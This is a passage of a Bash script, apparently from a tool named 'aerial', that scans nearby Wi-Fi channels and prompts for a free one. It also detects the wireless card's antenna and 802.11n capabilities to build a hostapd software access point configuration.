						if [ "`grep "Free" $MEM_DIR/channels.txt | awk '{print $1}' | sed -n ''$i',+0p'`" -ge 1 ] && [ "`grep "Free" $MEM_DIR/channels.txt | awk '{print $1}' | sed -n ''$i',+0p'`" -le 13 ];then
							$necho "$GREEN""`grep "Free" $MEM_DIR/channels.txt | awk '{print $1}' | sed -n ''$i',+0p'`" "$END"
						fi
					done
				echo
			else
				$necho "Suggested 802.11g Channels                  max  54Mbit/s : "$RED"None. All seems to be reserved."$END""
			fi
		fi

		# Suggested IEEE 802.11n 20Mhz Channels
		if [ -f $MEM_DIR/suggested_channels_20Mhz.txt ];then
			$necho "Suggested 802.11n Channels-20Mhz (1 Antenna max 72Mbit/s) : "
				for i in $(seq 1 "`cat $MEM_DIR/suggested_channels_20Mhz.txt | sort | uniq | sort -n | wc -l`")
				do
					if [ "`cat $MEM_DIR/suggested_channels_20Mhz.txt | sort | uniq | sort -n | sed -n ''$i',+0p'`" -ge 1 ] && [ "`cat $MEM_DIR/suggested_channels_20Mhz.txt | sort | uniq | sort -n | sed -n ''$i',+0p'`" -le 64 ];then
						$necho "$GREEN""`cat $MEM_DIR/suggested_channels_20Mhz.txt | sort | uniq | sort -n | sed -n ''$i',+0p'` ""$END"
					fi
				done
			echo
		rm $MEM_DIR/suggested_channels_20Mhz.txt			
		else
			$cecho "Suggested 802.11n Channels-20Mhz (1 Antenna max 72Mbit/s) : "$RED"None. All seems to be reserved."$END""
		fi

		# Suggested IEEE 802.11n 40Mhz Channels
		if [ -f $MEM_DIR/suggested_channels_40Mhz.txt ];then
			$necho "Suggested 802.11n Channels-40Mhz (1 Antenna max 150Mbit/s): "

				for i in $(seq 1 "`cat $MEM_DIR/suggested_channels_40Mhz.txt | sort | uniq | sort -n | wc -l`")
				do
					if [ "`cat $MEM_DIR/suggested_channels_40Mhz.txt | sort | uniq | sort -n | sed -n ''$i',+0p'`" -ge 1 ] && [ "`cat $MEM_DIR/suggested_channels_40Mhz.txt | sort | uniq | sort -n | sed -n ''$i',+0p'`" -le 64 ];then
						$necho "$GREEN""`cat $MEM_DIR/suggested_channels_40Mhz.txt | sort | uniq | sort -n | sed -n ''$i',+0p'` ""$END"
					fi
				done
		echo
		rm $MEM_DIR/suggested_channels_40Mhz.txt
		echo
		$cecho "* Please have in mind that we are following loose rules for suggested channels. e.g. If we select channel 1"
		$cecho "and we choose 40Mhz channel width then we are looking to be free only the channels: 3 (Center) and 5 (2nd ch)."
		$cecho "The specifications calls for requiring that we should have ALL channels from 1 to 7 free of use."
		$cecho "Channel 1 (22MHz wide): 2412 MHz -(22Mhz/2) + 40MHz channels width = 2441MHz = channel 7 (2442MHz)."
		echo
		$cecho "To achieve maximum output, a pure 802.11n 5GHz network is recommended. The 5 GHz band has substantial capacity" 
		$cecho "due to many non-overlapping radio channels and less radio interference as compared to the 2.4 GHz band."
		$cecho ""$BLUE"http://en.wikipedia.org/wiki/IEEE_802.11n-2009#40.C2.A0MHz_in_2.4.C2.A0GHz"$END""
		else
			$necho "Suggested 802.11n Channels-40Mhz (1 Antenna max 150Mbit/s): "$RED"None. All seems to be reserved."$END""
			$cecho ""$BLUE"http://en.wikipedia.org/wiki/IEEE_802.11n-2009"$END""
		fi
	elif [ "$ieee80211n" = "0" ];then
		# Suggested IEEE 802.11a Channels
		if [ -n "`grep "Free" $MEM_DIR/channels.txt | grep "36\|40\|44\|48\|52\|56\|60\|64\|100\|104\|108\|112\|116\|120\|124\|128\|132\|136\|140\|149\|153\|157\|161\|165"`" ];then
			if [ -n "`grep "Free" $MEM_DIR/channels.txt | grep "36\|40\|44\|48\|52\|56\|60\|64\|100\|104\|108\|112\|116\|120\|124\|128\|132\|136\|140\|149\|153\|157\|161\|165"`" ];then
				$necho "Suggested 802.11a Channels max 54Mbit/s: "
					for i in $(seq 1 "`grep "Free" $MEM_DIR/channels.txt | wc -l`")
					do
						if [ "`grep "Free" $MEM_DIR/channels.txt | awk '{print $1}' | sed -n ''$i',+0p'`" -ge 36 ] && [ "`grep "Free" $MEM_DIR/channels.txt | awk '{print $1}' | sed -n ''$i',+0p'`" -le 165 ];then
							$necho "$GREEN""`grep "Free" $MEM_DIR/channels.txt | awk '{print $1}' | sed -n ''$i',+0p'`" "$END"
						fi
					done
				echo
			else
				$necho "Suggested 802.11a Channels max 54Mbit/s: "$RED"None. All seems to be reserved."$END""
			fi
		fi
		# Suggested IEEE 802.11g Channels
		if [ -n "`grep "Free" $MEM_DIR/channels.txt | grep "01\|02\|03\|04\|05\|06\|07\|08\|09\|10\|12\|12\|13\|14"`" ];then
			if [ -n "`grep "Free" $MEM_DIR/channels.txt | grep "01\|02\|03\|04\|05\|06\|07\|08\|09\|10\|12\|12\|13\|14"`" ];then
				$necho "Suggested 802.11g Channels max 54Mbit/s: "
					for i in $(seq 1 "`grep "Free" $MEM_DIR/channels.txt | wc -l`")
					do
						if [ "`grep "Free" $MEM_DIR/channels.txt | awk '{print $1}' | sed -n ''$i',+0p'`" -ge 1 ] && [ "`grep "Free" $MEM_DIR/channels.txt | awk '{print $1}' | sed -n ''$i',+0p'`" -le 13 ];then
							$necho "$GREEN""`grep "Free" $MEM_DIR/channels.txt | awk '{print $1}' | sed -n ''$i',+0p'`" "$END"
						fi
					done
				echo
			else
				$necho "Suggested 802.11g Channels max 54Mbit/s: "$RED"None. All seems to be reserved."$END""
			fi
		fi
	fi
	}

	Channels_HEAD
	# Scan for broadcasting APs
	$necho "[....] Scanning for other Access Points and Ad-Hoc cells in range."
	ifconfig $WIFACE up
	iwlist $WIFACE scan >> $MEM_DIR/scan.txt
	$cecho "\r[ "$GREEN"ok"$END" ] Scanning for other Access Points and Ad-Hoc cells in range."
	echo
	# Available channels for wireless NIC
	for i in $(seq 1 "`iwlist $WIFACE channel | grep "Channel " | grep -v "Current Frequency" | sed -e 's/.*Channel //' -e 's/ :.*$//' | wc -l`")
		do 
			export a="`iwlist $WIFACE channel | grep "Channel " | grep -v "Current Frequency" | sed -e 's/.*Channel //' -e 's/ :.*$//' | sed -n ''$i',+0p' `"
				if [ "$a" -ge "1" ] && [ "$a" -le "13" ] && [ "$ieee80211n" = "1" ];then
					echo "    $a        Free               802.11g/n" >> $MEM_DIR/channels.txt
				elif [ "$a" -ge "1" ] && [ "$a" -le "13" ] && [ "$ieee80211n" = "0" ];then
					echo "    $a        Free               802.11g" >> $MEM_DIR/channels.txt
				elif [ "$a" = "14" ] && [ "$ieee80211n" = "1" ];then
					echo "    $a   Not Permitted           802.11g/n" >> $MEM_DIR/channels.txt
				elif [ "$a" = "14" ] && [ "$ieee80211n" = "0" ];then
					echo "    $a   Not Permitted           802.11g" >> $MEM_DIR/channels.txt
				elif [ "$a" = "36" -o "$a" = "40" -o "$a" = "44" -o "$a" = "48" -o "$a" = "52" -o "$a" = "56" -o "$a" = "60" -o "$a" = "64" ] && [ "$ieee80211n" = "1" ];then
					echo "    $a        Free               802.11a/n" >> $MEM_DIR/channels.txt
				elif [ "$a" = "36" -o "$a" = "40" -o "$a" = "44" -o "$a" = "48" -o "$a" = "52" -o "$a" = "56" -o "$a" = "60" -o "$a" = "64" ] && [ "$ieee80211n" = "0" ];then
					echo "    "$a"        Free               802.11a" >> $MEM_DIR/channels.txt
				elif [ "$a" = "100" -o "$a" = "104" -o "$a" = "108" -o "$a" = "112" -o "$a" = "116" -o "$a" = "120" -o "$a" = "124" -o "$a" = "128" -o "$a" = "132" -o "$a" = "136" -o "$a" = "140" -o "$a" = "149" -o "$a" = "153" -o "$a" = "157" -o "$a" = "161" -o "$a" = "165" ] && [ "$ieee80211n" = "1" ];then
					echo "    $a   Not Permitted           802.11a/n" >> $MEM_DIR/channels.txt
				elif [ "$a" = "100" -o "$a" = "104" -o "$a" = "108" -o "$a" = "112" -o "$a" = "116" -o "$a" = "120" -o "$a" = "124" -o "$a" = "128" -o "$a" = "132" -o "$a" = "136" -o "$a" = "140" -o "$a" = "149" -o "$a" = "153" -o "$a" = "157" -o "$a" = "161" -o "$a" = "165" ] && [ "$ieee80211n" = "0" ];then
					echo "    $a        Free               802.11a" >> $MEM_DIR/channels.txt
				fi		
			
			for c in $(seq 1 "`cat $MEM_DIR/scan.txt | grep "Frequency:" | sort | uniq | sort -n | sed -e 's/.*Channel //' -e 's/).*$//' | wc -l`")
			do 
				export b="`cat $MEM_DIR/scan.txt | grep "Frequency:" | sort | uniq | sort -n | sed -e 's/.*Channel //' -e 's/).*$//' | sed -n ''$c',+0p'`"
				if test $a -eq $b;then
					if [ $b -ge 1 ] && [ $b -le 13 ] && [ "$ieee80211n" = "1" ];then
						sed 's%    '$a'.*%    '$a'      Reserved             802.11g/n%g' $MEM_DIR/channels.txt > $MEM_DIR/channels.txt1 && mv $MEM_DIR/channels.txt1 $MEM_DIR/channels.txt
					elif [ $b -ge 1 ] && [ $b -le 13 ] && [ "$ieee80211n" = "0" ];then
						sed 's%    '$a'.*%    '$a'      Reserved             802.11g%g' $MEM_DIR/channels.txt > $MEM_DIR/channels.txt1 && mv $MEM_DIR/channels.txt1 $MEM_DIR/channels.txt
					elif [ $b = 14 ] && [ "$ieee80211n" = "1" ];then
						sed 's%    '$a'.*%    '$a'  Not Permitted & Reserved  802.11g/n%g' $MEM_DIR/channels.txt > $MEM_DIR/channels.txt1 && mv $MEM_DIR/channels.txt1 $MEM_DIR/channels.txt
					elif [ $b = 14 ] && [ "$ieee80211n" = "0" ];then
						sed 's%    '$a'.*%    '$a'  Not Permitted & Reserved  802.11g%g' $MEM_DIR/channels.txt > $MEM_DIR/channels.txt1 && mv $MEM_DIR/channels.txt1 $MEM_DIR/channels.txt
					elif [ $b = "36" -o $b = "40" -o $b = "44" -o $b = "48" -o $b = "52" -o $b = "56" -o $b = "60" -o $b = "64" ] && [ "$ieee80211n" = "1" ];then
						sed 's%    '$a'.*%    '$a'      Reserved             802.11a/n%g' $MEM_DIR/channels.txt > $MEM_DIR/channels.txt1 && mv $MEM_DIR/channels.txt1 $MEM_DIR/channels.txt
					elif [ $b = "36" -o $b = "40" -o $b = "44" -o $b = "48" -o $b = "52" -o $b = "56" -o $b = "60" -o $b = "64" ] && [ "$ieee80211n" = "0" ];then
						sed 's%    '$a'.*%    '$a'      Reserved             802.11a%g' $MEM_DIR/channels.txt > $MEM_DIR/channels.txt1 && mv $MEM_DIR/channels.txt1 $MEM_DIR/channels.txt
					elif [ $b = "100" -o $b = "104" -o $b = "108" -o $b = "112" -o $b = "116" -o $b = "120" -o $b = "124" -o $b = "128" -o $b = "132" -o $b = "136" -o $b = "140" -o $b = "149" -o $b = "153" -o $b = "157" -o $b = "161" -o $b = "165" ] && [ "$ieee80211n" = "1" ];then
						sed 's%    '$a'.*%    '$a'  Not Permitted & Reserved  802.11a/n%g' $MEM_DIR/channels.txt > $MEM_DIR/channels.txt1 && mv $MEM_DIR/channels.txt1 $MEM_DIR/channels.txt
					elif [ $b = "100" -o $b = "104" -o $b = "108" -o $b = "112" -o $b = "116" -o $b = "120" -o $b = "124" -o $b = "128" -o $b = "132" -o $b = "136" -o $b = "140" -o $b = "149" -o $b = "153" -o $b = "157" -o $b = "161" -o $b = "165" ] && [ "$ieee80211n" = "0" ];then
						sed 's%    '$a'.*%    '$a'  Not Permitted & Reserved  802.11a%g' $MEM_DIR/channels.txt > $MEM_DIR/channels.txt1 && mv $MEM_DIR/channels.txt1 $MEM_DIR/channels.txt
					fi

				fi
			done
		done

	Suggested_Channels
	export first_chan="`head -1 $MEM_DIR/channels.txt | awk '{print $1}'`"
	export last_chan="`tail -1 $MEM_DIR/channels.txt | awk '{print $1}'`"

	# If channel was found in aerial.conf then get it from there.
	# if not, then if a free channel was founded then use it
	# if not then use the first channel that we have found (free or not)
	if [ -n "`grep 'CHANNEL' $HOME_DIR/aerial.conf | awk '{print $2}'`" ];then
		export CUR_CHAN="`grep 'CHANNEL' $HOME_DIR/aerial.conf | awk '{print $2}'`"
	elif [ -n "`grep "Free" $MEM_DIR/channels.txt | head -1 | awk '{print$1}'`" ];then
		export CUR_CHAN="`grep "Free" $MEM_DIR/channels.txt | head -1 | awk '{print$1}'`"
	else
		export CUR_CHAN="$first_chan"
	fi

	echo
	$cecho "Enter the channel for your SoftAP [Optional]"
	$cecho "Please select (if any) a Free channel ("$RED"$first_chan - $last_chan"$END")"
	$necho "Press ENTER for current channel ("$GREEN"$CUR_CHAN"$END"): "
		while read CHAN; do
			if [ -z "${CHAN}" ]; then
				export CHAN="$CUR_CHAN"
				sed 's%CHANNEL.*%CHANNEL '$CHAN'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
				rm $MEM_DIR/scan.txt
				break
			else
				# If a channel was given then check if that channel exist in iwlist 'interface' channel command
				# In our case the output of the previous command are in temporary created channels.txt file.
				NUMSTRIPPED="`echo $CHAN | sed 's/[^0-9]//g' | sed 's/^0*//'`"
				# if NUMSTRIPPED empty it means that no numbers was given, only letters. Set NUMSTRIPPED to 5000 (out of channels range)
				# Yeah I know! -:) It's an ungly way
				if [ -z "${NUMSTRIPPED}" ];then
					NUMSTRIPPED="5000"
				fi

				# 802.11g/n Channels
				if [ "$NUMSTRIPPED" -ge 1 ] && [ "$NUMSTRIPPED" -le 13 ];then
					for c in $(seq 1 "`cat $MEM_DIR/channels.txt | awk '{print $1}' | wc -l`")
						do 
							export b="`cat $MEM_DIR/channels.txt | awk '{print $1}' | sed -n ''$c',+0p'`"
							if test $NUMSTRIPPED -eq $b;then
								export CHAN="`echo $CHAN | sed 's/^0*//'`"
								sed 's%CHANNEL.*%CHANNEL '$CHAN'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
								rm $MEM_DIR/scan.txt
								break
							fi
						done
					break
				elif [ "$NUMSTRIPPED" = "36" ] || [ "$NUMSTRIPPED" = "40" ] || [ "$NUMSTRIPPED" = "44" ] || [ "$NUMSTRIPPED" = "48" ] || [ "$NUMSTRIPPED" = "52" ] || [ "$NUMSTRIPPED" = "56" ] || [ "$NUMSTRIPPED" = "60" ] || [ "$NUMSTRIPPED" = "64" ] || [ "$NUMSTRIPPED" = "100" ] || [ "$NUMSTRIPPED" = "104" ] || [ "$NUMSTRIPPED" = "108" ] || [ "$NUMSTRIPPED" = "112" ] || [ "$NUMSTRIPPED" = "116" ] || [ "$NUMSTRIPPED" = "120" ] || [ "$NUMSTRIPPED" = "124" ] || [ "$NUMSTRIPPED" = "128" ] || [ "$NUMSTRIPPED" = "132" ] || [ "$NUMSTRIPPED" = "136" ] || [ "$NUMSTRIPPED" = "140" ] || [ "$NUMSTRIPPED" = "149" ] || [ "$NUMSTRIPPED" = "153" ] || [ "$NUMSTRIPPED" = "157" ] || [ "$NUMSTRIPPED" = "161" ] || [ "$NUMSTRIPPED" = "165" ];then
						if  [ "$NUMSTRIPPED" = "$CHAN" ] && [ -n "`grep -v "Not Permitted" $MEM_DIR/channels.txt | grep "$NUMSTRIPPED"`" ];then
							sed 's%CHANNEL.*%CHANNEL '$CHAN'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
							rm $MEM_DIR/scan.txt
							break
						else
							Channels_HEAD
							Suggested_Channels
							echo
							$cecho ""$GREEN"$CHAN"$END" "$RED"Not Permitted to be selected."$END""
							echo
							$cecho "Enter the channel for your SoftAP [Optional]"
							$cecho "Please select (if any) a Free channel ("$RED"$first_chan - $last_chan"$END")"
							$necho "Press ENTER for current channel ("$GREEN"$CUR_CHAN"$END"): "
						fi
				else	 
					Channels_HEAD
					Suggested_Channels
					echo
					$cecho ""$GREEN"$CHAN"$END" "$RED"it's not a valid channel"$END""
					echo
					$cecho "Enter the channel for your SoftAP [Optional]"
					$cecho "Please select (if any) a Free channel ("$RED"$first_chan - $last_chan"$END")"
					$necho "Press ENTER for current channel ("$GREEN"$CUR_CHAN"$END"): "
				fi
			fi
		done
	#################################################################################################################
	# 						Hostapd								#
	#														#
	#################################################################################################################
	if [ "$CHAN" -ge 1 ] && [ "$CHAN" -le 13 ];then
		export hostapd_mode="g"
		sed 's%IEEE_802_11_mode.*%IEEE_802_11_mode '$hostapd_mode'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
	elif [ "$CHAN" = "36" ] || [ "$CHAN" = "40" ] || [ "$CHAN" = "44" ] || [ "$CHAN" = "48" ] || [ "$CHAN" = "52" ] || [ "$CHAN" = "56" ] || [ "$CHAN" = "60" ] || [ "$CHAN" = "64" ] || [ "$CHAN" = "100" ] || [ "$CHAN" = "104" ] || [ "$CHAN" = "108" ] || [ "$CHAN" = "112" ] || [ "$CHAN" = "116" ] || [ "$CHAN" = "120" ] || [ "$CHAN" = "124" ] || [ "$CHAN" = "128" ] || [ "$CHAN" = "132" ] || [ "$CHAN" = "136" ] || [ "$CHAN" = "140" ] || [ "$CHAN" = "149" ] || [ "$CHAN" = "153" ] || [ "$CHAN" = "157" ] || [ "$CHAN" = "161" ] || [ "$CHAN" = "165" ];then
		# You would need to have a card that is programmed for a country that allows 5 GHz AP operations.
		# Maybe you should use channels 36-48 for IEEE 802.11a
		export hostapd_mode="a"
		sed 's%IEEE_802_11_mode.*%IEEE_802_11_mode '$hostapd_mode'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
	fi

	#########################################################################################################################
	# 						Hostapd - IEEE 802.11n							#
	# 	Find if our wireless NIC support IEEE 802.11n and if yes then find wich capabilities are supported		#
	#															#
	#			freq		HT40-		HT40+								#
	#			2.4 GHz		5-13		1-7 (1-9 in Europe/Japan)					#
	#			5 GHz		40,48,56,64	36,44,52,60							#
	#															#
	# http://www.smallnetbuilder.com/wireless/wireless-features/31743-bye-bye-40-mhz-mode-in-24-ghz-part-1			#
	# http://superuser.com/questions/791481/what-is-the-relation-between-number-of-wifi-antenna-and-number-of-spatial-stream#
	#########################################################################################################################

	# To run 300Mbit you need two spatial streams, and for this you need two antennas, which (like the name suggests) need	# 
	# a spatial distance between them (minimum half of the wavelength. This would be a minimum of 6cm for 2.4 GHz. 		#
	# This cannot work with an usb-dongle without external antennas. "300Mbit/s" sounds good for marketing purposes, and 	#
	# thats the reason why they use a 2x2 chip,  but i really doubt that the antenna-layout of some usb-dongle allow 	#
	# multiple spatial streams and the antennas on your pci-card are quite near too.					#	
	# check speed with : iw wlanX station dump

	clear

	AVAILBL_CONFIG_ANTENNAS(){
	export AVAILBL_ANTENNAS="`iw $PHY info | grep "Available Antennas:" | awk '{print $4}' | sed 's%0x%%g'`"
	export CONFIG_ANTENNAS="`iw $PHY info | grep "Configured Antennas:" | awk '{print $4}' | sed 's%0x%%g'`"

	if [ -z "$AVAILBL_ANTENNAS" ] || [ "$AVAILBL_ANTENNAS" = "0" ] || [ "$AVAILBL_ANTENNAS" -ge 16 ];then
		export AVAILBL_ANTENNAS=""$RED"Not Supported by driver"$END""
	else
		export 	AVAILBL_ANTENNAS="`echo "obase=2;"$AVAILBL_ANTENNAS"" | bc`"
	fi
	if [ -z "$CONFIG_ANTENNAS" ] || [ "$CONFIG_ANTENNAS" = 0 ] || [ "$CONFIG_ANTENNAS" -ge 16 ];then
		export CONFIG_ANTENNAS=""$RED"Not Supported by driver"$END""
	else
		export 	CONFIG_ANTENNAS="`echo "obase=2;"$CONFIG_ANTENNAS"" | bc`"
	fi

	case $AVAILBL_ANTENNAS in
		"1")
			export AVAILBL_ANTENNAS=""$GREEN"Bit-mask: "$AVAILBL_ANTENNAS": One - One active"$END""
			break;;
		"01"|"10")
			export AVAILBL_ANTENNAS=""$GREEN"Bit-mask: "$AVAILBL_ANTENNAS": Two - One active"$END""
			break;;
		"11")
			export AVAILBL_ANTENNAS=""$GREEN"Bit-mask: "$AVAILBL_ANTENNAS": Two - Two active"$END""
			break;;
		"001"|"010"|"100")
			export AVAILBL_ANTENNAS="""$GREEN"$GREEN"Bit-mask: "$AVAILBL_ANTENNAS": Three - One active"$END""
			break;;
		"011"|"101"|"110")
			export AVAILBL_ANTENNAS=""$GREEN"Bit-mask: "$AVAILBL_ANTENNAS": Three - Two active"$END""
			break;;
		"111")
			export AVAILBL_ANTENNAS=""$GREEN"Bit-mask: "$AVAILBL_ANTENNAS": Three - Three active"$END""
			break;;
		"0001"|"0010"|"0100"|"1000")
			export AVAILBL_ANTENNAS=""$GREEN"Bit-mask: "$AVAILBL_ANTENNAS": Four - One active"$END""
			break;;
		"0011"|"0110"|"1100"|"1001"|"0101"|"1010")
			export AVAILBL_ANTENNAS=""$GREEN"Bit-mask: "$AVAILBL_ANTENNAS": Four - Two active"$END""
			break;;
		"0111"|"1110"|"1101"|"1011")
			export AVAILBL_ANTENNAS=""$GREEN"Bit-mask: "$AVAILBL_ANTENNAS": Four - Three active"$END""
			break;;
		"1111")
			export AVAILBL_ANTENNAS=""$GREEN"Bit-mask: "$AVAILBL_ANTENNAS": Four - Four active"$END""
			break;;
	esac

	case $CONFIG_ANTENNAS in
		"1")
			export CONFIG_ANTENNAS=""$GREEN"Bit-mask: "$CONFIG_ANTENNAS": One - One active"$END""
			break;;
		"01"|"10")
			export CONFIG_ANTENNAS=""$GREEN"Bit-mask: "$CONFIG_ANTENNAS": Two - One active"$END""
			break;;
		"11")
			export CONFIG_ANTENNAS=""$GREEN"Bit-mask: "$CONFIG_ANTENNAS": Two - Two active"$END""
			break;;
		"001"|"010"|"100")
			export CONFIG_ANTENNAS=""$GREEN"Bit-mask: "$CONFIG_ANTENNAS": Three - One active"$END""
			break;;
		"011"|"101"|"110")
			export CONFIG_ANTENNAS=""$GREEN"Bit-mask: "$CONFIG_ANTENNAS": Three - Two active"$END""
			break;;
		"111")
			export CONFIG_ANTENNAS=""$GREEN"Bit-mask: "$CONFIG_ANTENNAS": Three - Three active"$END""
			break;;
		"0001"|"0010"|"0100"|"1000")
			export CONFIG_ANTENNAS=""$GREEN"Bit-mask: "$CONFIG_ANTENNAS": Four - One active"$END""
			break;;
		"0011"|"0110"|"1100"|"1001"|"0101"|"1010")
			export CONFIG_ANTENNAS=""$GREEN"Bit-mask: "$CONFIG_ANTENNAS": Four - Two active"$END""
			break;;
		"0111"|"1110"|"1101"|"1011")
			export CONFIG_ANTENNAS=""$GREEN"Bit-mask: "$CONFIG_ANTENNAS": Four - Three active"$END""
			break
		;;
		"1111")
			export CONFIG_ANTENNAS=""$GREEN"Bit-mask: "$CONFIG_ANTENNAS": Four - Four active"$END""
			break;;
	esac
	}

	IEEE_802_11n_CAPABILITIES(){
	# 2.4 GHz - Channel width set 20 MHz and 40 MHz - Channels 1 to 4 : Upper 40
	if [ -n "`iw $PHY info | grep -o "HT20/HT40"`" ] && [ $CHAN -ge 1 ] && [ $CHAN -le 4 ];then
		$cecho "Supported channel width set         : "$GREEN"Both 20 MHz and 40 MHz"$END""
		export ht_capab="[HT40+][HT20]"
	# 2.4 GHz - Channel width set 20 MHz and 40 MHz - Channels 5 to 9 : Upper 40 - Lower 40 
	# Find the right one depending on +0/+4/+2 or +0/-4/-2 free channels.
	elif [ -n "`iw $PHY info | grep -o "HT20/HT40"`" ] && [ $CHAN -ge 5 ] && [ $CHAN -le 9 ];then
		$cecho "Supported channel width set         : "$GREEN"Both 20 MHz and 40 MHz"$END""
		export CHAN_plus_4="`expr $CHAN + 4`"
		export CHAN_plus_2="`expr $CHAN + 2`"
		export CHAN_minus_4="`expr $CHAN - 4`"
		export CHAN_minus_2="`expr $CHAN - 2`"
		if [ "$CHAN" -ge 1 -a "$CHAN" -le 9 ] && [ "`expr length "$CHAN"`" = "1" ];then
			export  CHAN=0$CHAN
		fi
		if [ "$CHAN_plus_4" -ge 1 -a "$CHAN_plus_4" -le 9 ] && [ "`expr length "$CHAN_plus_4"`" = "1" ];then
			export  CHAN_plus_4=0$CHAN_plus_4
		fi
		if [ "$CHAN_plus_2" -ge 1 -a "$CHAN_plus_2" -le 9 ] && [ "`expr length "$CHAN_plus_2"`" = "1" ];then
			export CHAN_plus_2=0$CHAN_plus_2
		fi
		if [ "$CHAN_minus_4" -ge 1 -a "$CHAN_minus_4" -le 9 ] && [ "`expr length "$CHAN_minus_4"`" = "1" ];then
			export CHAN_minus_4=0$CHAN_minus_4
		fi
		if [ "$CHAN_minus_2" -ge 1 -a "$CHAN_minus_2" -le 9 ] && [ "`expr length "$CHAN_minus_2"`" = "1" ];then
			export CHAN_minus_2=0$CHAN_minus_2
		fi
		if [ -n "`grep "Free" $MEM_DIR/channels.txt | grep "$CHAN"`" ] && [ -n "`grep "Free" $MEM_DIR/channels.txt | grep "$CHAN_plus_4"`" ] && [ -n "`grep "Free" $MEM_DIR/channels.txt | grep "$CHAN_plus_2"`" ];then
			export ht_capab="[HT40+][HT20]"
		elif [ -n "`grep "Free" $MEM_DIR/channels.txt | grep "$CHAN"`" ] && [ -n "`grep "Free" $MEM_DIR/channels.txt | grep -- "$CHAN_minus_4"`" ] &&  [ -n "`grep "Free" $MEM_DIR/channels.txt | grep -- "$CHAN_minus_2"`" ];then
			export ht_capab="[HT40-][HT20]"
		else
			export ht_capab="[HT40+][HT40-][HT20]"
		fi
	# 2.4 GHz - Channel width set 20 MHz and 40 MHz - Channels 10 to 13 - Lower 40
	elif [ -n "`iw $PHY info | grep -o "HT20/HT40"`" ] && [ $CHAN -ge 10 ] && [ $CHAN -le 13 ];then
		$cecho "Supported channel width set         : "$GREEN"Both 20 MHz and 40 MHz"$END""
		export ht_capab="[HT40-][HT20]"
	# 5 GHz - Channel width set 20 MHz and 40 MHz - Channels 36,44,52,60  - Upper 40
	elif [ -n "`iw $PHY info | grep -o "HT20/HT40"`" ] && [ $CHAN = 36 -o $CHAN = 44 -o $CHAN = 52 -o $CHAN = 60 ];then
		$cecho "Supported channel width set         : "$GREEN"Both 20 MHz and 40 MHz"$END""
		export ht_capab="[HT40+][HT20]"
	# 5 GHz - Channel width set 20 MHz and 40 MHz - Channels 40,48,56,64  - Lower 40
	elif [ -n "`iw $PHY info | grep -o "HT20/HT40"`" ] && [ $CHAN = 40 -o $CHAN = 48 -o $CHAN = 56 -o $CHAN = 64 ];then
		$cecho "Supported channel width set         : "$GREEN"Both 20 MHz and 40 MHz"$END""
		export ht_capab="[HT40-][HT20]"
	#  2.4 GHz & 5 GHz - Channel width set 20 MHz - Channels 1 to 13 and 36,40,44,48,52,56,60
	elif [ -n "`iw $PHY info | grep -o "HT20"`" ] && [ $CHAN -ge 1 -o $CHAN -le 13 ] && [ $CHAN = 36 -o $CHAN = 40 -o $CHAN = 44 -o $CHAN = 48 -o $CHAN = 52 -o $CHAN = 56 -o $CHAN = 60 -o $CHAN = 64 ];then
		$cecho "Supported channel width set         : "$GREEN"20 MHz"$END""
		export ht_capab="[HT20]"
	fi
	
	if [ -n "`iw $PHY info | grep -o "RX LDPC"`" ] && [ "$ieee80211n" = "1" ];then
		$cecho "LDPC coding capability              : "$GREEN"Supported"$END""
		export ht_capab=$ht_capab"[LDPC]"
	elif [ ! -n "`iw $PHY info | grep -o "RX LDPC"`" ] && [ "$ieee80211n" = "1" ];then
		$cecho "LDPC coding capability              : "$RED"Not supported"$END""
	fi
	if [ -n "`iw $PHY info | grep -o "Static SM Power Save"`" ] && [ "$ieee80211n" = "1" ];then
		echo "Spatial Multiplexing (SM) Power Save: "$GREEN"Static"$END""
		export ht_capab=$ht_capab"[SMPS-STATIC]"
	elif [ -n "`iw $PHY info | grep -o "Dynamic SM Power Save"`" ] && [ "$ieee80211n" = "1" ];then
		$cecho "Spatial Multiplexing (SM) Power Save: "$GREEN"Dynamic"$END""
		export ht_capab=$ht_capab"[SMPS-DYNAMIC]"
	elif [ -n "`iw $PHY info | grep -o "SM Power Save disabled"`" ] && [ "$ieee80211n" = "1" ];then
		$cecho "Spatial Multiplexing (SM) Power Save: "$RED"Disabled"$END""
	fi
	if [ -n "`iw $PHY info | grep -o "RX Greenfield"`" ] && [ "$ieee80211n" = "1" ];then
		$cecho "HT-Greenfield                       : "$GREEN"Enabled"$END""
		export ht_capab=$ht_capab"[GF]"
	elif [ ! -n "`iw $PHY info | grep -o "RX Greenfield"`" ] && [ "$ieee80211n" = "1" ];then
		$cecho "HT-Greenfield                       : "$RED"Disabled"$END""
	fi
	if [ -n "`iw $PHY info | grep -o "RX HT20 SGI"`" ] && [ "$ieee80211n" = "1" ];then
		$cecho "SGI-Short Guard Interval for 20 MHz : "$GREEN"Enabled"$END""
		export ht_capab=$ht_capab"[SHORT-GI-20]"
	elif [ ! -n "`iw $PHY info | grep -o "RX HT20 SGI"`" ] && [ "$ieee80211n" = "1" ];then
		$cecho "SGI-Short Guard Interval for 20 MHz : "$RED"Disabled"$END""
	fi
	if [ -n "`iw $PHY info | grep -o "RX HT40 SGI"`" ] && [ "$ieee80211n" = "1" ];then
		$cecho "SGI-Short Guard Interval for 40 MHz : "$GREEN"Enabled"$END""
		export ht_capab=$ht_capab"[SHORT-GI-40]"
	elif [ ! -n "`iw $PHY info | grep -o "RX HT40 SGI"`" ] && [ "$ieee80211n" = "1" ];then
		$cecho "SGI-Short Guard Interval for 40 MHz : "$RED"Disabled"$END""
	fi
	if [ -n "`iw $PHY info | grep -o "TX STBC"`" ] && [ "$ieee80211n" = "1" ];then
		$cecho "Tx STBC (Space–Time Block Codes)    : "$GREEN"Enabled"$END""
		export ht_capab=$ht_capab"[TX-STBC]"
	elif [ ! -n "`iw $PHY info | grep -o "TX STBC"`" ] && [ "$ieee80211n" = "1" ];then
		#Not set means disabled
